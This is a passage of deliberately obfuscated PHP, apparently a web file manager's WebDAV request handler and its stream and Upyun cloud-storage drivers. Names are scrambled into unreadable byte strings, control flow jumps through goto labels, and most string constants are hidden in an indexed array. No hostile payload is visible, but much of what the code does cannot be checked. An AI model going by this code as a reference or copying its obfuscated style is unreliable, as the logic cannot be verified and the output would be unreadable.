array($Eìßí–—âê[1784], $Eìßí–—âê[1785]); if (!in_array($fÏ¶»”ˆ”ã, $EÒ©´Õ¡ÓĞ) && !$this->pathExists($this->path)) { $dùÁ ëš¼ = array($Eìßí–—âê[1029] => 404); } else { $dùÁ ëš¼ = $this->{$fÏ¶»”ˆ”ã}(); } goto fÉ§Ö¦·æ¨; fÉ§Ö¦·æ¨: if (!$dùÁ ëš¼) { return; } self::response($dùÁ ëš¼); goto CİÕ¯™«; CİÕ¯™«: } public function pathGet($a™Ì‹°†Ú­ = false) { $f‰ÈÍÈÒ‡¡ =& $_SERVER[©]; $AÄëãó›õÎ = $a™Ì‹°†Ú­ ? $_SERVER[$f‰ÈÍÈÒ‡¡[1786]] : $_SERVER[$f‰ÈÍÈÒ‡¡[1385]]; $AÄëãó›õÎ = KodIO::clear(rawurldecode($AÄëãó›õÎ)); if (!strstr($AÄëãó›õÎ, KodIO::clear($this->urlBase))) { return !1; } return substr($AÄëãó›õÎ, strpos($AÄëãó›õÎ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($DçÓ§¦¤ß—) { return file_exists($DçÓ§¦¤ß—); } public function pathMkdir($F“¥…Í¢İ—) { return mkdir($F“¥…Í¢İ—, 511, !0); } public function pathInfo($Dƒ‹ë†îÍÈ) { return path_info($Dƒ‹ë†îÍÈ); } public function pathList($BùÂÚ¾ŸÕ†) { return path_list($BùÂÚ¾ŸÕ†); } public function pathOut($Aë†ä ‚–©) { echo file_get_contents($Aë†ä ‚–©); } public function pathPut($AÆÌ¬ùºµ, $Bîµ‰¼ˆ¸« = '') { if (!$Bîµ‰¼ˆ¸«) { return file_put_contents($AÆÌ¬ùºµ, $_SERVER[©][43]); } return move_path($Bîµ‰¼ˆ¸«, $AÆÌ¬ùºµ); } public function pathRemove($aÌÎ²Š£ó) { if (is_file($aÌÎ²Š£ó)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($A¸Îé—õ², $f™Ê¡ƒ¡) { return move_path($A¸Îé—õ², $f™Ê¡ƒ¡); } public function pathCopy($f¯ç¿×¥—Ï, $b²éƒ†…¬) { return copy_dir($f¯ç¿×¥—Ï, $b²éƒ†…¬); } public function parsePath($b°ãä™Šó) { return $b°ãä™Šó; } public function parseItem($bšÎàÍ‰ƒ, $c×œ¡¨ÊŠƒ) { goto c‡¾„Šâˆ©; E—ã‰‰ßš: $e¡ç·°­¹ = array($EÆºÛ×ÃØß[1787] => KodIO::clear($this->urlBase . $AøğÔÆæ), $EÆºÛ×ÃØß[117] => @gmdate($EÆºÛ×ÃØß[1788], $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[117]]), $EÆºÛ×ÃØß[197] => @gmdate($EÆºÛ×ÃØß[1789], $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[197]]), $EÆºÛ×ÃØß[87] => $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[87]] ? $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[87]] : 0); return $e¡ç·°­¹; goto fÚÃŞ‹èˆ†; c‡¾„Šâˆ©: $EÆºÛ×ÃØß =& $_SERVER[©]; $AøğÔÆæ = $this->pathGet() . $EÆºÛ×ÃØß[18] . $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[38]]; $AøğÔÆæ = $EÆºÛ×ÃØß[18] . str_replace($EÆºÛ×ÃØß[182], $EÆºÛ×ÃØß[18], rawurlencode($AøğÔÆæ)); goto c¿Âà‡Áè‰; c¿Âà‡Áè‰: if ($c×œ¡¨ÊŠƒ) { $AøğÔÆæ = $EÆºÛ×ÃØß[18] . str_replace($EÆºÛ×ÃØß[182], $EÆºÛ×ÃØß[18], rawurlencode($this->pathGet())); } if (!trim($bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[117]])) { $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[117]] = time(); } if (!trim($bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[197]])) { $bšÎàÍ‰ƒ[$EÆºÛ×ÃØß[197]] = time(); } goto E—ã‰‰ßš; fÚÃŞ‹èˆ†: } public function parseItemXml($fƒ ÃŠÃ³¤, $FÑàò“«â°) { $A„Ù»ãë§ =& $_SERVER[©]; $D¥×Üç´ = $this->parseItem($fƒ ÃŠÃ³¤, $FÑàò“«â°); if ($fƒ ÃŠÃ³¤[$A„Ù»ãë§[39]] == $A„Ù»ãë§[86]) { $f«¼ÏÒ„ = $A„Ù»ãë§[1790]; $f«¼ÏÒ„ .= $A„Ù»ãë§[1791]; } else { $AÕË‡ËØÖ… = $fƒ ÃŠÃ³¤[$A„Ù»ãë§[170]] ? $fƒ ÃŠÃ³¤[$A„Ù»ãë§[170]] : get_path_ext($fƒ ÃŠÃ³¤[$A„Ù»ãë§[38]]); $BöÓî¼ŞóÌ = get_file_mime($AÕË‡ËØÖ…); $f«¼ÏÒ„ = $A„Ù»ãë§[1792]; $f«¼ÏÒ„ .= "\74\x44\x3a\147\145\x74\143\157\156\164\x65\156\164\x74\171\x70\x65\76{$BöÓî¼ŞóÌ}\74\x2f\x44\x3a\147\x65\x74\x63\x6f\156\164\x65\156\x74\x74\171\160\x65\76"; } return "\12\x9\11\74\x44\72\162\x65\163\x70\x6f\x6e\163\x65\76\xa\x9\x9\11\x3c\x44\x3a\150\162\145\x66\76{$D¥×Üç´[$A„Ù»ãë§[1787]]}\x3c\57\104\x3a\150\162\x65\x66\x3e\xa\x9\11\11\74\x44\72\x70\x72\157\160\x73\164\141\164\x3e\12\x9\11\11\x9\74\104\x3a\160\x72\x6f\x70\76\12\11\11\x9\11\x9\x3c\104\x3a\147\145\x74\x6c\141\163\164\155\157\x64\151\146\x69\145\x64\x3e{$D¥×Üç´[$A„Ù»ãë§[117]]}\x3c\x2f\104\x3a\x67\145\164\x6c\141\x73\164\x6d\x6f\x64\x69\146\151\145\x64\76\xa\11\x9\x9\11\11\x3c\104\72\143\162\x65\141\x74\x69\157\x6e\144\141\x74\145\76{$D¥×Üç´[$A„Ù»ãë§[197]]}\74\x2f\104\x3a\143\162\145\141\164\x69\x6f\156\144\141\x74\x65\76\12\x9\x9\x9\x9\11\x3c\104\72\147\x65\x74\143\157\x6e\x74\x65\156\x74\154\145\156\x67\x74\x68\76{$D¥×Üç´[$A„Ù»ãë§[87]]}\x3c\57\x44\x3a\147\145\164\143\157\156\164\145\156\164\154\x65\156\x67\164\x68\76\xa\11\11\11\11\11{$f«¼ÏÒ„}\12\x9\x9\x9\11\x3c\x2f\104\x3a\x70\x72\x6f\160\76\xa\11\x9\11\11\x3c\x44\72\x73\164\141\164\165\x73\76\x48\x54\124\120\57\x31\56\61\x20\x32\x30\x30\x20\117\113\74\x2f\x44\72\163\x74\x61\x74\165\x73\76\12\x9\x9\x9\x3c\x2f\x44\x3a\x70\x72\157\160\163\x74\x61\x74\76\12\x9\x9\74\57\104\72\162\145\163\160\x6f\x6e\163\x65\x3e"; } public function pathListMerge($bŞÓÕ“‹…) { goto F²ˆ‡ÈÈª•; F²ˆ‡ÈÈª•: $C £”î…° =& $_SERVER[©]; if (!$bŞÓÕ“‹…) { return $bŞÓÕ“‹…; } $D‚”ò¡“ºõ = array($C £”î…°[83], $C £”î…°[84], $C £”î…°[1793]); goto F·ÛØ¹…ˆ; F·ÛØ¹…ˆ: $cš‹æ«ç³” = array(); foreach ($bŞÓÕ“‹… as $B×¢‹¥±¬Í => $b¨í¹Éê¡) { if (!in_array($B×¢‹¥±¬Í, $D‚”ò¡“ºõ) || !is_array($b¨í¹Éê¡)) { continue; } $cš‹æ«ç³” = array_merge($cš‹æ«ç³”, $b¨í¹Éê¡); } foreach ($cš‹æ«ç³” as &$Cº³ãœ™œ) { $Cº³ãœ™œ[$C £”î…°[38]] = str_replace($C £”î…°[18], $C £”î…°[1387], $Cº³ãœ™œ[$C £”î…°[38]]); } goto aÏğËÙ›ªÍ; aÏğËÙ›ªÍ: return $cš‹æ«ç³”; goto B··È«Ñ„í; B··È«Ñ„í: } public function httpPROPFIND() { goto d‚÷…©º§Ê; F¡‰…±Œ™İ: return array($Eœ–¿ÀˆæÀ[1796] => 207, $Eœ–¿ÀˆæÀ[1797] => "\x3c\x44\x3a\155\165\x6c\164\x69\163\x74\x61\164\x75\x73\40\170\155\154\156\x73\x3a\104\75\x22\104\x41\126\x3a\42\x3e\12{$bø…ìè²Š}\xa\74\x2f\104\x3a\155\x75\154\164\x69\163\x74\141\x74\x75\163\x3e"); goto b°¸àŞëº; fÂš¡¤ŠÚÍ: if ($E‰¹åÜ¢“) { $EÅíÜæÌ©é = array($Eå»£í½’Ò); } else { $Eå»£í½’Ò[$Eœ–¿ÀˆæÀ[38]] = $Eœ–¿ÀˆæÀ[43]; $EÅíÜæÌ©é = array_merge(array($Eå»£í½’Ò), $EÅíÜæÌ©é); } $bø…ìè²Š = $Eœ–¿ÀˆæÀ[43]; foreach ($EÅíÜæÌ©é as $e’­¡…Ø¯•) { $bø…ìè²Š .= $this->parseItemXml($e’­¡…Ø¯•, $E‰¹åÜ¢“); } goto F¡‰…±Œ™İ; cÔ²Ëø¡¨ö: $Eå»£í½’Ò = $BÁšçîÕ…[$Eœ–¿ÀˆæÀ[1794]]; if (!is_array($EÅíÜæÌ©é) || $Eå»£í½’Ò[$Eœ–¿ÀˆæÀ[1795]] === !1) { return array($Eœ–¿ÀˆæÀ[1796] => 404, $Eœ–¿ÀˆæÀ[1797] => $Eœ–¿ÀˆæÀ[1798]); } $E‰¹åÜ¢“ = $Eå»£í½’Ò[$Eœ–¿ÀˆæÀ[39]] == $Eœ–¿ÀˆæÀ[177] || HttpHeader::get($Eœ–¿ÀˆæÀ[1773]) == $Eœ–¿ÀˆæÀ[476]; goto fÂš¡¤ŠÚÍ; d‚÷…©º§Ê: $Eœ–¿ÀˆæÀ =& $_SERVER[©]; $BÁšçîÕ… = $this->pathList($this->path); $EÅíÜæÌ©é = $this->pathListMerge($BÁšçîÕ…); goto cÔ²Ëø¡¨ö; b°¸àŞëº: } public function httpHEAD() { $d®ïÏ‚·Û… =& $_SERVER[©]; $A¥š©’ËÇ‘ = $this->pathInfo($this->path); if (!$A¥š©’ËÇ‘ || $A¥š©’ËÇ‘[$d®ïÏ‚·Û…[39]] == $d®ïÏ‚·Û…[86]) { return array($d®ïÏ‚·Û…[1029] => 200, $d®ïÏ‚·Û…[1204] => array($d®ïÏ‚·Û…[1799])); } return array($d®ïÏ‚·Û…[1029] => 200, $d®ïÏ‚·Û…[1204] => array($d®ïÏ‚·Û…[1800], $d®ïÏ‚·Û…[146], $d®ïÏ‚·Û…[1801] . $A¥š©’ËÇ‘[$d®ïÏ‚·Û…[87]], $d®ïÏ‚·Û…[1802] . get_file_mime($A¥š©’ËÇ‘[$d®ïÏ‚·Û…[170]]), $d®ïÏ‚·Û…[142] . gmdate($d®ïÏ‚·Û…[1788], $A¥š©’ËÇ‘[$d®ïÏ‚·Û…[1251]]) . $d®ïÏ‚·Û…[1803], $d®ïÏ‚·Û…[1804])); } public function httpOPTIONS() { $CîŠøŠÀÖø =& $_SERVER[©]; return array($CîŠøŠÀÖø[1029] => 200, $CîŠøŠÀÖø[1204] => array($CîŠøŠÀÖø[1805], $CîŠøŠÀÖø[1806], $CîŠøŠÀÖø[1807], $CîŠøŠÀÖø[1260])); } public function httpPROPPATCH() { $b‡…Œ—™· =& $_SERVER[©]; $Aïš²Ñêâ = $b‡…Œ—™·[1808] . $_SERVER[$b‡…Œ—™·[1385]] . $b‡…Œ—™·[1809]; return array($b‡…Œ—™·[1796] => 207, $b‡…Œ—™·[1797] => "\x3c\104\72\x6d\x75\154\x74\151\163\164\x61\164\165\x73\40\170\155\x6c\156\163\x3a\104\x3d\42\x44\101\126\72\x22\76\xa{$Aïš²Ñêâ}\xa\x3c\57\x44\x3a\155\165\154\164\x69\163\164\141\x74\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $DØ„­ÒĞø =& $_SERVER[©]; $C×ìèÔ›£Í = $this->uploadFile(); if ($C×ìèÔ›£Í) { $cïÓñ‹¤¨ = 204; } else { $C×ìèÔ›£Í = $DØ„­ÒĞø[43]; $cïÓñ‹¤¨ = 201; } $B¿’ã¶Å½ = $this->pathPut($this->path, $C×ìèÔ›£Í); if ($B¿’ã¶Å½ == !1) { $cïÓñ‹¤¨ = 404; } return array($DØ„­ÒĞø[1796] => $cïÓñ‹¤¨); } private function uploadFile() { goto E¸—±ƒ“âÈ; DÚá•’Ë Ë: $Fƒç¨¾¨ÚŸ = @fopen($C×ô¿¨°£©, $A™äÄ¸„ĞÊ[1519]); $B”ŠºÊªÔÒ = @fopen($A™äÄ¸„ĞÊ[1811], $A™äÄ¸„ĞÊ[1518]); if (!$B”ŠºÊªÔÒ || !$Fƒç¨¾¨ÚŸ) { @unlink($C×ô¿¨°£©); return !1; } goto dçÎÄÅ±; E¸—±ƒ“âÈ: $A™äÄ¸„ĞÊ =& $_SERVER[©]; @mk_dir(TEMP_FILES); $C×ô¿¨°£© = TEMP_FILES . $A™äÄ¸„ĞÊ[1810] . rand_string(32); goto DÚá•’Ë Ë; EŸšÃÎâÖ‡: if (@filesize($C×ô¿¨°£©) > 0) { return $C×ô¿¨°£©; } @unlink($C×ô¿¨°£©); return !1; goto B¨À˜ƒÆë‰; dçÎÄÅ±: while (!feof($B”ŠºÊªÔÒ)) { fwrite($Fƒç¨¾¨ÚŸ, fread($B”ŠºÊªÔÒ, 1024 * 200)); } fclose($B”ŠºÊªÔÒ); fclose($Fƒç¨¾¨ÚŸ); goto EŸšÃÎâÖ‡; B¨À˜ƒÆë‰: } public function httpMKCOL() { $c™’°ÆªÄ× =& $_SERVER[©]; if ($this->pathExists($this->path)) { return array($c™’°ÆªÄ×[1029] => 409); } $E·ëÁã‰Ç = $this->pathMkdir($this->path); return array($c™’°ÆªÄ×[1029] => $E·ëÁã‰Ç ? 201 : 403); } public function httpMOVE() { $a¾¼Êê¸… =& $_SERVER[©]; $f…ğ‰ÒÖ ® = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$a¾¼Êê¸…[1812]])) { $c¨Ë¶Ñ‡Ê˜[$a¾¼Êê¸…[1813]] = $_SERVER[$a¾¼Êê¸…[1812]] == $a¾¼Êê¸…[1814]; } $Câ¬Ô×ê—Ø = $this->pathMove($this->path, $f…ğ‰ÒÖ ®); return array($a¾¼Êê¸…[1029] => $Câ¬Ô×ê—Ø ? 201 : 404); } public function httpCOPY() { $bïâÜĞƒÑ = $this->parsePath($this->pathGet(!0)); $a””Í×¾±É = $this->pathCopy($this->path, $bïâÜĞƒÑ); return array($_SERVER[©][1029] => $a””Í×¾±É ? 201 : 404); } public function httpDELETE() { $fÛÌ†Ï³Å² = $this->pathRemove($this->path); return array($_SERVER[©][1029] => $fÛÌ†Ï³Å² ? 200 : 503); } public function httpLOCK() { $FïŠİ¯ƒ =& $_SERVER[©]; $DáÜÑ­ì…Â = md5($this->path); $Eà‡¸ÙØŸ° = $FïŠİ¯ƒ[1815] . $this->xmlGet($FïŠİ¯ƒ[1816]) . $FïŠİ¯ƒ[1817] . $DáÜÑ­ì…Â . $FïŠİ¯ƒ[1818]; return array($FïŠİ¯ƒ[1029] => 200, $FïŠİ¯ƒ[1204] => array($FïŠİ¯ƒ[1819] . $DáÜÑ­ì…Â, $FïŠİ¯ƒ[1820]), $FïŠİ¯ƒ[1821] => $Eà‡¸ÙØŸ°); } public function httpUNLOCK() { return array($_SERVER[©][1029] => 204); } public function xmlGet($dÕ¸ å†ğ®) { goto bÆŠ“á©÷Æ; bÆŠ“á©÷Æ: $D¹õ‰°¬í =& $_SERVER[©]; static $A’‰ÉÍ¨Œ± = false; if (!$A’‰ÉÍ¨Œ±) { $F²½Â·œËê = file_get_contents($D¹õ‰°¬í[1822]); $A’‰ÉÍ¨Œ± = new DOMDocument(); $A’‰ÉÍ¨Œ±->loadXML($F²½Â·œËê); } goto a¾ÒÚàÎé; a¾ÒÚàÎé: $Bçê«—Ç¾ = array_shift(explode($D¹õ‰°¬í[18], $dÕ¸ å†ğ®)); $A…«ƒàæÕˆ = $A’‰ÉÍ¨Œ±->getElementsByTagNameNS($D¹õ‰°¬í[1823], $Bçê«—Ç¾); if ($A…«ƒàæÕˆ) { return $A…«ƒàæÕˆ[0]->nodeValue; } goto a„½“Šõáº; a„½“Šõáº: return $D¹õ‰°¬í[43]; goto fÏˆ¦éÉ¿; fÏˆ¦éÉ¿: } public static function response($E—åƒİÜ‚) { goto a÷Åö¿¾¡Ø; B¿™ãÉÓÔ: $Fˆß•«›‡[] = $béÛ¨ŒÑãÙ[1763]; $Fˆß•«›‡[] = $béÛ¨ŒÑãÙ[1764]; foreach ($Fˆß•«›‡ as $Aöé›Ğ‰’) { header($Aöé›Ğ‰’); } goto D‹­è×´ƒ’; a÷Åö¿¾¡Ø: $béÛ¨ŒÑãÙ =& $_SERVER[©]; $Fˆß•«›‡ = is_array($E—åƒİÜ‚[$béÛ¨ŒÑãÙ[1204]]) ? $E—åƒİÜ‚[$béÛ¨ŒÑãÙ[1204]] : array(); $Fˆß•«›‡[] = HttpHeader::code($E—åƒİÜ‚[$béÛ¨ŒÑãÙ[1029]]); goto B¿™ãÉÓÔ; D‹­è×´ƒ’: if (is_string($E—åƒİÜ‚[$béÛ¨ŒÑãÙ[1821]])) { header($béÛ¨ŒÑãÙ[1824]); $f¾š²®Š® = $béÛ¨ŒÑãÙ[1825] . $béÛ¨ŒÑãÙ[9] . $E—åƒİÜ‚[$béÛ¨ŒÑãÙ[1821]]; echo $f¾š²®Š®; } goto f£µÇÓ©ö…; f£µÇÓ©ö…: } } goto AÇØš¹“°; AàÆ•ÔÓŞ: function beforeShutdownFatalError($f¿Äæ¥ëÏ™) { think_exception($f¿Äæ¥ëÏ™); } $_SERVER[$_SERVER[ÊÖŠ][48]] = $cËƒ—¯‚…Ç($_SERVER[$_SERVER[ÊÖŠ][45]]); $bÊâàí¤… = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto F½ÇÂå˜å÷; b“…ÄÀ¶ùµ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bÛ¤›Š‘–ğ, $Dœ³Ÿâô¡¤ = 0) { parent::__construct(); $this->source = $bÛ¤›Š‘–ğ; $this->sourceSize = $Dœ³Ÿâô¡¤; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($F‚Ù¦êÕ½è = false) { return $this->sourceSize; } public function getContent($f™¦©ãªŞÇ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $dìßÕÛïİ‹ = ftell($this->source); $f®±«îñì¸ = @fread($this->source, $this->sourceSize); fseek($this->source, $dìßÕÛïİ‹); return $f®±«îñì¸; } } public function fileSubstr($cä¾²œèÍê = false, $f¨´ëÌÕº­ = 0, $CÌËïÒ„‰í = 0) { if (!$CÌËïÒ„‰í) { $CÌËïÒ„‰í = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f¨´ëÌÕº­, $CÌËïÒ„‰í); } if ($this->sourceType == self::TYPE_FILE) { $C°¯˜¿ğ¿ = ftell($this->source); fseek($this->source, $C°¯˜¿ğ¿ + $f¨´ëÌÕº­); $F»ø—­èÏ = @fread($this->source, $CÌËïÒ„‰í); fseek($this->source, $C°¯˜¿ğ¿); return $F»ø—­èÏ; } } public function hashMd5($D•º“˜ĞåÖ = false) { return md5($this->getContent()); } public static function hash($Eñİ¾ÔŠŠ—, $Cº¦½“‘¶ğ = 0) { $B“½›è°ÉÓ = new PathDriverStream($Eñİ¾ÔŠŠ—, $Cº¦½“‘¶ğ); return $B“½›è°ÉÓ->hashSimple($Eñİ¾ÔŠŠ—); } public static function md5($A„·¾ëÜÀ, $AöŞßŞÁÂ = 0) { $aÁá§ÀÛì¡ = new PathDriverStream($A„·¾ëÜÀ, $AöŞßŞÁÂ); return $aÁá§ÀÛì¡->hashMd5($A„·¾ëÜÀ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\x74\x70\x3a\57\x2f\x76\60\56\x61\160\151\x2e\x75\x70\171\x75\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($bÊ®“ÇÚ’é) { parent::__construct(); $this->_init($bÊ®“ÇÚ’é); } public function _init($Bäœ„•÷) { foreach ($Bäœ„•÷ as $c´Ú„½·• => $F½¬æóå‡) { if (isset($this->{$c´Ú„½·•})) { $this->{$c´Ú„½·•} = $F½¬æóå‡; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[©][1238], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($E˜…¤‹¢ ‰, $c¥é¶Ë¶Î = "\x47\105\124") { $dÓ˜“¨‰«Á =& $_SERVER[©]; $d…µˆºÆ‰² = gmdate($dÓ˜“¨‰«Á[1202]); $f™¼½ùº˜ = base64_encode(hash_hmac($dÓ˜“¨‰«Á[1239], "{$c¥é¶Ë¶Î}\x26{$E˜…¤‹¢ ‰}\46{$d…µˆºÆ‰²}", md5("{$this->userpass}"), !0)); $E—Ä²°âÙÍ = array("\x41\165\x74\150\157\162\x69\172\x61\x74\x69\x6f\156\72\125\120\x59\x55\x4e\40{$this->username}\72{$f™¼½ùº˜}", "\x44\141\164\x65\72{$d…µˆºÆ‰²}"); return $E—Ä²°âÙÍ; } public function ussRequest($EŞâÌ‡†Ó, $fçÏñÒÎ• = "\107\x45\124", $fåÁ†¹”ªí = false, $cÏ•ïÉä„ = false, $fÎĞÖÛØ = false) { goto BÚë³ğ™…; B¬ï›¹ ö²: $eï×ßøõ = $this->ussHeaders($D‹œ‰®ê«—, $fçÏñÒÎ•); if ($cÏ•ïÉä„) { $eï×ßøõ = array_merge($eï×ßøõ, $cÏ•ïÉä„); } $aŒØ—ÆËù = url_request($this->endpoint . $D‹œ‰®ê«—, $fçÏñÒÎ•, $fåÁ†¹”ªí, $eï×ßøõ, $fÎĞÖÛØ); goto B£×‰‰åğ; B£×‰‰åğ: if (!$aŒØ—ÆËù) { return array($f†Ñ´Â£[1029] => !1, $f†Ñ´Â£[1031] => $f†Ñ´Â£[1240]); } if (strtolower($fçÏñÒÎ•) == $f†Ñ´Â£[194] || in_array($aŒØ—ÆËù[$f†Ñ´Â£[1029]], array($f†Ñ´Â£[1097], $f†Ñ´Â£[1241]))) { $fåÁ†¹”ªí = $aŒØ—ÆËù[$f†Ñ´Â£[1242]]; } else { $fåÁ†¹”ªí = json_decode($aŒØ—ÆËù[$f†Ñ´Â£[1031]], !0); if (!$fåÁ†¹”ªí) { $fåÁ†¹”ªí = $aŒØ—ÆËù[$f†Ñ´Â£[1031]]; } else { if (!$aŒØ—ÆËù[$f†Ñ´Â£[688]] && isset($fåÁ†¹”ªí[$f†Ñ´Â£[1243]])) { $fåÁ†¹”ªí = $fåÁ†¹”ªí[$f†Ñ´Â£[1243]]; } } } return array($f†Ñ´Â£[1029] => $aŒØ—ÆËù[$f†Ñ´Â£[688]], $f†Ñ´Â£[1031] => $fåÁ†¹”ªí); goto f ƒÖ±îŞ¸; BÚë³ğ™…: $f†Ñ´Â£ =& $_SERVER[©]; $EŞâÌ‡†Ó = trim($EŞâÌ‡†Ó, $f†Ñ´Â£[18]); $D‹œ‰®ê«— = "\57{$this->bucket}\57{$EŞâÌ‡†Ó}"; goto B¬ï›¹ ö²; f ƒÖ±îŞ¸: } public function mkfile($b¯÷ŒÛ¦‰·, $aªã—Ç„óã = '', $EÃî¥Š÷” = REPEAT_RENAME) { if ($this->setContent($b¯÷ŒÛ¦‰·, $aªã—Ç„óã)) { return $this->getPathOuter($b¯÷ŒÛ¦‰·); } return !1; } public function mkdir($aæƒç‘î, $e„ˆìÂÆñ¨ = REPEAT_SKIP) { $DÄ ÆØÊ =& $_SERVER[©]; $D§Ë‰¯ÀÕ = trim($aæƒç‘î, $DÄ ÆØÊ[18]); if ($this->_isFolder($D§Ë‰¯ÀÕ)) { return $this->getPathOuter($D§Ë‰¯ÀÕ); } $a¤’°‘ È¼ = array($DÄ ÆØÊ[1244]); $EÆŒÒÇ§„ = $this->ussRequest($D§Ë‰¯ÀÕ, $DÄ ÆØÊ[222], !1, $a¤’°‘ È¼); return $EÆŒÒÇ§„[$DÄ ÆØÊ[1029]] ? $this->getPathOuter($D§Ë‰¯ÀÕ) : !1; } public function copyFile($c¡ßİ‘óçª, $dœ“µ‡¿Ç†) { $e¨“„³Ÿæ =& $_SERVER[©]; $Fôğßõ ª = array($e¨“„³Ÿæ[1245] . "\x2f{$this->bucket}\57{$c¡ßİ‘óçª}", $e¨“„³Ÿæ[1246]); $eä“Ğ‡ĞÔø = $this->ussRequest($dœ“µ‡¿Ç†, $e¨“„³Ÿæ[224], !1, $Fôğßõ ª); return $eä“Ğ‡ĞÔø[$e¨“„³Ÿæ[1029]] ? !0 : $this->getPathOuter($dœ“µ‡¿Ç†); } public function moveFile($Dƒä‚”¹¥÷, $EäÆâˆè˜) { $D¹ƒ ¶ë =& $_SERVER[©]; $CÔ£àª‘¹à = array($D¹ƒ ¶ë[1247] . "\x2f{$this->bucket}\57{$Dƒä‚”¹¥÷}", $D¹ƒ ¶ë[1246]); $DÙòÎ‰‘ä = $this->ussRequest($EäÆâˆè˜, $D¹ƒ ¶ë[224], !1, $CÔ£àª‘¹à); return $DÙòÎ‰‘ä[$D¹ƒ ¶ë[1029]] ? !0 : $this->getPathOuter($EäÆâˆè˜); } public function delFile($FÃŠ›äÂÓ) { $cÆäÈ•Ñèá =& $_SERVER[©]; $BâŠ±¿ö” = $this->ussRequest($FÃŠ›äÂÓ, $cÆäÈ•Ñèá[1248]); return $BâŠ±¿ö”[$cÆäÈ•Ñèá[1029]] ? !0 : !1; } public function delFolder($AÈ‰ö—ÖÓŠ) { $Ağİ÷éâ‡¡ =& $_SERVER[©]; $eÒ¦›ïŒ˜¤ = $this->listAll($AÈ‰ö—ÖÓŠ); krsort($eÒ¦›ïŒ˜¤); foreach ($eÒ¦›ïŒ˜¤ as $a—ÃÛ³ŒÌÊ) { $this->ussRequest($a—ÃÛ³ŒÌÊ[$Ağİ÷éâ‡¡[85]], $Ağİ÷éâ‡¡[1248]); } return $this->ussRequest($AÈ‰ö—ÖÓŠ, $Ağİ÷éâ‡¡[1248]); } public function rename($b¡óİÕä«ê, $d¨©§øØ ì) { if ($this->isFile($b¡óİÕä«ê)) { $d¨©§øØ ì = get_path_father($b¡óİÕä«ê) . $d¨©§øØ ì; return $this->moveFile($b¡óİÕä«ê, $d¨©§øØ ì); } return $this->renameObject($b¡óİÕä«ê, $d¨©§øØ ì); } public function fileInfo($Bô©›™‘ƒ¸, $c©ĞŒ™Ö¢ = false, $C—®šßÂŠÙ = array()) { $cïğ‰ğ¿ Î =& $_SERVER[©]; if ($c©ĞŒ™Ö¢) { return array($cïğ‰ğ¿ Î[38] => $this->pathThis($Bô©›™‘ƒ¸), $cïğ‰ğ¿ Î[85] => $this->getPathOuter($cïğ‰ğ¿ Î[18] . $Bô©›™‘ƒ¸), $cïğ‰ğ¿ Î[39] => $cïğ‰ğ¿ Î[177], $cïğ‰ğ¿ Î[87] => isset($C—®šßÂŠÙ[$cïğ‰ğ¿ Î[334]]) ? $C—®šßÂŠÙ[$cïğ‰ğ¿ Î[334]] : 0, $cïğ‰ğ¿ Î[170] => $this->ext($Bô©›™‘ƒ¸)); } $d‰ÀˆÓÚ = array($cïğ‰ğ¿ Î[38] => $this->pathThis($Bô©›™‘ƒ¸), $cïğ‰ğ¿ Î[85] => $this->getPathOuter($cïğ‰ğ¿ Î[18] . $Bô©›™‘ƒ¸), $cïğ‰ğ¿ Î[39] => $cïğ‰ğ¿ Î[177], $cïğ‰ğ¿ Î[197] => 0, $cïğ‰ğ¿ Î[117] => isset($aÛË¡Ôêº»[$cïğ‰ğ¿ Î[1249]]) ? $aÛË¡Ôêº»[$cïğ‰ğ¿ Î[1249]] : 0, $cïğ‰ğ¿ Î[87] => isset($C—®šßÂŠÙ[$cïğ‰ğ¿ Î[334]]) ? $C—®šßÂŠÙ[$cïğ‰ğ¿ Î[334]] : 0, $cïğ‰ğ¿ Î[170] => $this->ext($Bô©›™‘ƒ¸), $cïğ‰ğ¿ Î[198] => !0, $cïğ‰ğ¿ Î[199] => !0); if (empty($C—®šßÂŠÙ)) { $C—®šßÂŠÙ = $this->objectMeta($Bô©›™‘ƒ¸); if (!$C—®šßÂŠÙ) { return $d‰ÀˆÓÚ; } $d‰ÀˆÓÚ[$cïğ‰ğ¿ Î[197]] = $C—®šßÂŠÙ[$cïğ‰ğ¿ Î[1250]]; $d‰ÀˆÓÚ[$cïğ‰ğ¿ Î[117]] = $C—®šßÂŠÙ[$cïğ‰ğ¿ Î[1251]]; $d‰ÀˆÓÚ[$cïğ‰ğ¿ Î[87]] = $C—®šßÂŠÙ[$cïğ‰ğ¿ Î[87]]; } return $d‰ÀˆÓÚ; } public function folderInfo($d‹ßÌ’‡¯±, $AˆŒù°°Íö = false) { $f‘º ±ŒÇ£ =& $_SERVER[©]; if ($AˆŒù°°Íö) { return array($f‘º ±ŒÇ£[38] => $this->pathThis($d‹ßÌ’‡¯±), $f‘º ±ŒÇ£[85] => $this->getPathOuter($f‘º ±ŒÇ£[18] . $d‹ßÌ’‡¯±), $f‘º ±ŒÇ£[39] => $f‘º ±ŒÇ£[86]); } $A÷ó´öËé = array($f‘º ±ŒÇ£[38] => 